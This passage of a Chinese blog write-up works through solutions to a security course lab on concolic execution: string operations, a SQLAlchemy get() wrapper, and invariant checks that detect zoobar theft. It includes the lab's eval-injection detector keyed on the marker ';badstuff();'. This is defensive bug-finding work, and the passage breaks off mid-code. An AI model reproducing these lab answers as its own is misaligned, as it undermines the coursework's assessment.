可能不会为每个变量分配值（例如变量可能与约束无关），我们需要从上次使用的字典继承到 <code>concolic_find_input()</code> 返回的新字典中，将新的字典添加到 <code>input</code> 队列中</li></ul><p>依照以上思路，笔者最后在大循环末尾补全代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">branch_len = <span class="hljs-built_in">len</span>(branch_conds)<br><span class="hljs-comment"># explore every branch</span><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(branch_len):<br>  <span class="hljs-comment"># construct new constraint for negative branch</span><br>  cur_constraint = concolic_force_branch(b, branch_conds, branch_callers)<br>  <span class="hljs-comment"># not in `checked` set, solve out the constraint</span><br>  <span class="hljs-keyword">if</span> cur_constraint <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> checked:<br>    checked.add(cur_constraint)<br>    sat, cur_concrete_values = concolic_find_input(cur_constraint, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># satisfiable, add the dict for next round</span><br>    <span class="hljs-keyword">if</span> sat:<br>      cur_concrete_values.inherit(concrete_values)<br>      inputs.add(cur_concrete_values, branch_callers[b])<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 6：</p><p><img src="https://s2.loli.net/2022/12/19/rSiUjGL92nlzOeb.png" alt="image.png"></p><p>至此，Lab 3 的 Part 1 <strong>全部完成</strong></p><h2 id="Concolic-execution-for-strings-and-Zoobar">Concolic execution for strings and Zoobar</h2><p>首先是 Exercise 7，补全对字符串与字符数组的两种运算支持：长度（<code>__len__</code>）与包含（<code>__contains__</code>）</p><blockquote><p><strong>Exercise 7.</strong> Finish the implementation of concolic execution for strings and byte-arrays in <code>symex/fuzzy.py</code>. We left out support for two operations on <code>concolic_str</code> and <code>concolic_bytes</code> objects. The first is computing the length of a string, and the second is checking whether a particular string <code>a</code> appears in string <code>b</code> (i.e., <code>a</code> is contained in <code>b</code>, the underlying implementation of Python’s “a in b” construct).</p><p>Look for the comment <code>Exercise 7: your code here</code> to find where you should implement the code for this exercise. We have already implemented the <code>sym_contains</code> and <code>sym_length</code> AST nodes for you, which should come in handy for this exercise.</p><p>Run <strong>./check-concolic-str.py</strong> <em>and</em> <strong>./check-symex-str.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>对于符号值而言该框架已经提供了封装好的 <code>sym_contains</code> 与 <code>sym_length</code> ，我们只需要实现对具体值的判断即可，这里别忘了最后的返回值应当调用 <code>concolic_bool()</code> 以在全局列表中添加路径约束与信息</p><p>待补全的两处皆为以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 7: your code here.</span><br><span class="hljs-comment">## Implement symbolic versions of string length (override __len__)</span><br><span class="hljs-comment">## and contains (override __contains__).</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-keyword">return</span> concolic_int(sym_length(ast(self)), <span class="hljs-built_in">len</span>(self.__v))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__contains__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_str):<br>    res = o.__v <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = o <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">return</span> concolic_bool(sym_contains(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 7：</p><p><img src="https://s2.loli.net/2022/12/19/CNrSIEkOe54tuoB.png" alt="image.png"></p><p>接下来我们需要在 Zoobar 中完成一个 <code>concolic HTTP request</code>，因此待查询的 username 也将为一个混合值（由 HTTP cookie 带来），于是接下来我们需要在 SQL 查询上应用混合执行，但 SQLite 由 C 而非 Python 编写，因此我们不能直接修改其内部代码</p><p>于是接下来来到 Exercise8，对 SQL 的 <code>get()</code> 应用一层 wrapper 以对 SQL 语句的结果应用混合执行：</p><blockquote><p><strong>Exercise 8.</strong> Figure out how to handle the SQL database so that the concolic engine can create constraints against the data returned by the database. To help you do this, we’ve written an empty wrapper around the sqlalchemy <code>get</code> method, in <code>symex/symsql.py</code>. Implement this wrapper so that concolic execution can try all possible records in a database. Examine <strong>./check-symex-sql.py</strong> to see how we are thinking of performing database lookups on concolic values.</p><p>You will likely need to consult the reference for the <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> to understand what the behavior of <code>get</code> should be and what your replacement implementation should be doing.</p><p>Run <strong>./check-symex-sql.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>那我们先看看 <code>./check-symex-sql.py</code> 里面的主体逻辑（关于 SQLalchemy 库相关的可以先看 <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> ），首先声明了 <code>Test1Base</code> 和 <code>Test2Base</code>，这两个相当于两组不同的测试用例，我们仅分析其中一组即可，之后定义了类 <code>Test1</code> 继承自 <code>Test1Base</code>，并为该数据库设置了两列，其中 <code>name</code> 为主键：</p><blockquote><p>这里按照笔者的理解，一个 <code>Test1</code> 实例表示的应该是在该数据库中一行的数据</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Test1Base = declarative_base()<br>Test2Base = declarative_base()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span>(<span class="hljs-title class_ inherited__">Test1Base</span>):<br>    __tablename__ = <span class="hljs-string">&quot;test1&quot;</span><br>    name = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    value = Column(Integer)<br></code></pre></td></tr></table></figure><p>之后是数据库初始化工作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbsetup</span>(<span class="hljs-params">name, base</span>):<br>    dbfile = os.path.join(dbdir, <span class="hljs-string">&quot;%s.db&quot;</span> % name)<br>    engine = create_engine(<span class="hljs-string">&#x27;sqlite:///%s&#x27;</span> % dbfile,<br>                           isolation_level=<span class="hljs-string">&#x27;SERIALIZABLE&#x27;</span>)<br>    base.metadata.create_all(engine)<br>    session = sessionmaker(bind=engine)<br>    <span class="hljs-keyword">return</span> session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test1_setup</span>():<br>    <span class="hljs-keyword">return</span> dbsetup(<span class="hljs-string">&quot;test1&quot;</span>, Test1Base)<br></code></pre></td></tr></table></figure><p>在 <code>test_f()</code> 中会调用 <code>test1_setup()</code> 进行数据库 <code>&quot;test1&quot;</code> 的创建，并创建一个混合字符串 <code>s</code>，将其作为参数给到数据库的 get 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    db = test1_setup()<br>    s = fuzzy.mk_str(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    r = db.query(Test1).get(s)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        v = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">else</span>:<br>        v = r.value<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>这里的 <code>query()</code> 展开来其实是 <code>SELECT test1.nameSELECT test1.name AS test1_name, test1.value AS test1_value FROM test1</code> 这样的 SQL 语句（比较笨的办法就是可以通过在 <code>get()</code> 中打印 <code>query</code> 的方式查看），其中选择的都是我们为 <code>Test1</code> 类所定义的变量，而 <code>get()</code> 的原始作用则为从查询结果中选择符合条件的一行</p><p>完成上述定义之后，在文件中首先调用 <code>test1_setup()</code> 进行数据库 <code>&quot;test1&quot;</code> 的创建，并添加了两行数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">t1 = test1_setup()<br>t1a = Test1()<br>t1a.name = <span class="hljs-string">&#x27;foo&#x27;</span><br>t1a.value = <span class="hljs-number">924</span><br>t1.add(t1a)<br>t1b = Test1()<br>t1b.name = <span class="hljs-string">&#x27;barr&#x27;</span><br>t1b.value = <span class="hljs-number">22</span><br>t1.add(t1b)<br>t1.commit()<br></code></pre></td></tr></table></figure><p>最后对 <code>test_f()</code> 应用混合执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Testing f..&#x27;</span>)<br>f_results = fuzzy.concolic_execs(test_f, verbose=<span class="hljs-number">10</span>)<br>f_expected = (<span class="hljs-number">924</span>, <span class="hljs-number">22</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(x <span class="hljs-keyword">in</span> f_results <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f_expected):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found all cases for f&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Missing some cases for f:&quot;</span>, <span class="hljs-built_in">set</span>(f_expected) - <span class="hljs-built_in">set</span>(f_results))<br></code></pre></td></tr></table></figure><p>接下来来到我们需要补全代码的 <code>symex/symsql.py</code> 当中，整理逻辑非常简单，只定义了一个待我们补全的 <code>newget()</code>，并用其替换掉了原有的 <code>get()</code> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This module wraps SQLalchemy&#x27;s methods to be friendly to</span><br><span class="hljs-comment">## symbolic / concolic execution.</span><br><br><span class="hljs-keyword">import</span> sqlalchemy.orm<br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> fuzzy<br><br>oldget = sqlalchemy.orm.query.Query.get<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>sqlalchemy.orm.query.Query.get = newget<br></code></pre></td></tr></table></figure><p>参数 <code>query</code> 其实就是后面创建的 Query 对象中的 <code>self</code>，接下来我们看看 SQLAlchemy 文档中有没有比较有用的方法，实际上在数据库的 <code>增删改查</code> 当中，对于本题而言我们只需要关注“查”，注意到有这样一个方法可以将查询结果以列表的形式返回：</p><p><img src="https://s2.loli.net/2022/12/21/CKVXIAh7OWpvobk.png" alt="image.png"></p><p>文档里没有仔细说清楚（ <s>也可能是👴没仔细看</s> ），笔者实测了一下，返回的列表的成员皆为 <code>Test1</code> 或 <code>Test2</code> 类型的对象实例，即 <code>一行的数据</code>，这里我们同时也可以看出在 <code>test1</code> 数据库中有两个 <code>Test1</code>（两行），刚好对应一开始添加进去的两行：</p><p><img src="https://s2.loli.net/2022/12/21/WLK4erN95ngCFil.png" alt="image.png"></p><p>那么我们的思路其实就比较清晰了，<code>get()</code> 的第二个参数为 <code>primary_key</code>，即我们只需要对比查询结果找到其中 <code>primary_key</code> 的值与传入的参数值相同的那一行并将其返回即可</p><p>在待混合执行函数 <code>test_f()</code> 与 <code>test_g()</code> 当中传入的 <code>primary_key()</code> 皆为 <code>concolic</code> 类型变量，而我们已经完成了 <code>concolic_int</code> 与 <code>concolic_str</code> 的 <code>__cmp__</code> 运算符重载，因此在重写的 get 函数中直接使用 <code>==</code> 进行对比即可</p><p>需要注意的是，虽然我们知道 <code>Test1</code> 的主键为 <code>name</code>，但这里相比起直接使用 <code>row.name</code>，我们需要且应当写一个<strong>更为通用的方法</strong>，在注释中提示我们可以使用 <code>r.__table__.primary_key.columns.keys()[0]</code> 获取主键名的字符串，因此我们可以使用 Python 的内置方法 <code>getattr()</code> 来获取主键的值，因此最后的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  rows = query.<span class="hljs-built_in">all</span>()<br><br>  <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> query.<span class="hljs-built_in">all</span>():<br>    primary_key_in_row = <span class="hljs-built_in">getattr</span>(r, r.__table__.primary_key.columns.keys()[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> primary_key_in_row == primary_key:<br>      <span class="hljs-keyword">return</span> r<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 8：</p><p><img src="https://s2.loli.net/2022/12/21/wIzaOhY4bJxsNgq.png" alt="image.png"></p><blockquote><p>注意这里需要<strong>额外通过 Exercise 9 的第一项才表示做对了</strong>，因为后面需要借助这里的符号执行代码演示一些东西</p></blockquote><p>现在我们可以开始对 Zoobar 应用我们的混合执行框架了，我们首先尝试运行 <code>./check-symex-zoobar.py</code>，在其中有着对 Zoobar 使用符号输入的相关逻辑，且为了让混合执行能够快速结束，其过度约束了给予 Zoobar 的输入，此外所有的 HTTP 请求方法（于 <code>environ['REQUEST_METHOD']</code> 中）皆为 <code>GET</code>，且请求的所有 UQL（于 <code>environ['PATH_INFO']</code> 中）皆以 <code>trans</code> 起始</p><p>相较于直接运行，Lab 更推荐使用 <code>script</code> 来运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>之后屏幕上会持续打出一堆信息：</p><p><img src="https://s2.loli.net/2022/12/21/D79tqYuBGXFHPjd.png" alt="image.png"></p><p>大概十几秒后结束，迭代的数量表示不同的路径：</p><p><img src="https://s2.loli.net/2022/12/21/UHD4s6MIq9pRCBc.png" alt="image.png"></p><blockquote><p>和实验手册中不同的是笔者这里有 <code>142 iterations</code>，但在实验手册里是 <code>139</code>，这里暂且先不管（</p></blockquote><p>由于 Zoobar 由 Python 编写，故不会有内存损坏这一类的漏洞（这句话是实验手册说的，但是<a href="https://www.cvedetails.com/cve/CVE-2021-3177/"> CVE-2021-3177</a>和一众其他 CVE 表示：怎么会是呢？），因此我们没法立刻辨明在这一百多路径中是否存在问题，因此我们需要借助一些显式的不变量（invariant）来捕捉表示安全问题的情况</p><p>Lab 已经实现了的一个不变量便是 eval injection——即对 <code>eval()</code> 的参数进行注入，在 <code>symex/symeval.py</code> 中 Lab 给出了对这种情况的检查思路：若传给 <code>eval()</code> 的字符串可以包含  <code>;badstuff();</code> ，说明我们发现了一个 eval injection 漏洞——由此我们可以让混合执行系统去尝试构建能包含该子串的字符串</p><p>我们可以使用如下命令查看 Zoobar 中是否存在 eval injection 漏洞：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py | grep <span class="hljs-string">&quot;Exception: eval injection&quot;</span></span><br></code></pre></td></tr></table></figure><p>结果如下，发现了两个 eval injection：</p><p><img src="https://s2.loli.net/2022/12/21/YslcqeuVP2C6Ni7.png" alt="image.png"></p><p>现在我们来看  <code>symex/symeval.py</code>  的内部逻辑，其逻辑比较简单，主要就是给内置的 <code>eval()</code> 套了一层 wrapper，检查参数是否带有  <code>;badstuff();</code> 字符串，若是则直接抛异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">real_eval = builtins.<span class="hljs-built_in">eval</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myeval</span>(<span class="hljs-params">expr, <span class="hljs-built_in">globals</span> = <span class="hljs-literal">None</span>, <span class="hljs-built_in">locals</span> = <span class="hljs-literal">None</span></span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;;badstuff();&#x27;</span> <span class="hljs-keyword">in</span> expr:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;eval injection&quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">locals</span> = <span class="hljs-built_in">globals</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    frame = inspect.currentframe()<br>    <span class="hljs-keyword">try</span>:<br>      <span class="hljs-built_in">locals</span> = frame.f_back.f_locals<br>      <span class="hljs-built_in">globals</span> = frame.f_back.f_globals<br>    <span class="hljs-keyword">finally</span>:<br>      <span class="hljs-keyword">del</span> frame<br><br>  <span class="hljs-comment">## Try to evaluate the expression as an integer</span><br>  v = str_to_small_int(expr)<br>  <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> v<br><br>  <span class="hljs-keyword">return</span> real_eval(expr, <span class="hljs-built_in">globals</span>, <span class="hljs-built_in">locals</span>)<br>builtins.<span class="hljs-built_in">eval</span> = myeval<br></code></pre></td></tr></table></figure><p>而在 <code>check-symex-zoobar.py</code> 当中，应用了混合执行框架的为 <code>test_stuff()</code> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fuzzy.concolic_execs(test_stuff, maxiter=<span class="hljs-number">500</span>, verbose=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>这里我们暂且先不关注 Zoobar 的实现为何，我们主要关注如何使用我们的混合执行系统来寻找其中的漏洞，在 <code>test_stuff()</code> 中实际上是通过将部分参数设置为混合值来进行混合执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  <span class="hljs-comment"># Zoobar初始化工作</span><br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  <span class="hljs-comment">##...</span><br><br>  <span class="hljs-comment">## 设置环境变量</span><br>  environ = &#123;&#125;<br>  <span class="hljs-comment">##...</span><br>  environ[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;referrer&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>  environ[<span class="hljs-string">&#x27;HTTP_COOKIE&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;cookie&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>接下来我们需要实现两种额外的不变量检查以检查 Zoobar 是否存在其他漏洞：</p><ul><li>若没有新用户被注册，则所有用户的 Zoobar balances 之和应当在每次请求间保持一致</li><li>若用户 <code>u</code> 没有向 Zoobar 进行请求，<code>u</code> 的 Zoobar balance 不应当缩小</li></ul><p>于是来到 Exercise 9，向  <code>check-symex-zoobar.py</code> 中添加相应的不变量检查：</p><blockquote><p><strong>Exercise 9.</strong> Add invariant checks to <code>check-symex-zoobar.py</code> to implement the above two rules (total balance preservation and no zoobar theft). Look for the comment <code>Exercise 9: your code here</code> to see where you should write this code. When you detect a zoobar balance mismatch, call the <code>report_balance_mismatch()</code> function. When you detect zoobar theft, call <code>report_zoobar_theft()</code>.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to re-run <strong>./check-symex-zoobar.py</strong> and see whether the output contains the messages <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you (run <code>check-symex-zoobar.py</code> and look for these magic strings).</p></blockquote><p>在 Zoobar 中实际上是通过 <code>zoobar.app()</code> 来完成 HTTP 请求的解析实现，因此在  <code>test_stuff()</code>  中选择直接构造请求（<code>environ</code> 字典）传递给该函数来模拟向 Zoobar 发送 HTTP 请求的过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">environ = &#123;&#125;<br><span class="hljs-comment">##...</span><br>environ[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>] = <span class="hljs-string">&#x27;trans&#x27;</span> + fuzzy.mk_str(<span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">if</span> environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].startswith(<span class="hljs-string">&#x27;//&#x27;</span>):<br>  <span class="hljs-comment">## Don&#x27;t bother trying to construct paths with lots of slashes;</span><br>  <span class="hljs-comment">## otherwise, the lstrip() code generates lots of paths..</span><br>  <span class="hljs-keyword">return</span><br><br>resp = zoobar.app(environ, startresp)<br><span class="hljs-keyword">if</span> verbose:<br>  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> resp:<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>我们对代码的检查则是在请求完成后进行的，首先是对 balance 的检查，这里不了解 Zoobar 的相关结构（或者没来得及~~/懒得~~看）也不要紧，在 <code>test_stuff()</code> 的开头有这样的计算 balances 总和的逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  <span class="hljs-comment"># 计算 balance 总和</span><br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br></code></pre></td></tr></table></figure><p>对于单个用户而言我们可以使用 <code>person.zoobars</code> 获取其 balance，而我们可以通过 <code>pdb.query(zoobar.zoodb.Person).all()</code> 获取用户对象列表 ，那么我们只需要在请求结束后使用同样的逻辑计算当前的 balance，并与原 balance 对比即可，若不一致则按手册说明调用 <code>report_balance_mismatch()</code> 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 9: your code here.</span><br><br><span class="hljs-comment">## Detect balance mismatch.</span><br><span class="hljs-comment">## When detected, call report_balance_mismatch()</span><br>balance2 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br><span class="hljs-keyword">if</span> balance1 != balance2:<br>  report_balance_mismatch()<br></code></pre></td></tr></table></figure><p>然后是第二个问题，我们需要找到没有进行操作但是 balance 缩小了的用户（即发生转出），由于在测试函数中仅进行了一次操作，故未进行操作的用户的 balance <strong>不应当小于初始值</strong>（但是可以大于，因为可以有别的账户向其进行转入），因此我们需要知道一个用户的初始信息</p><p>在 <code>test_stuff()</code> 开头便对应创建了两个数据库，因此我们可以从其定义入手：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br> 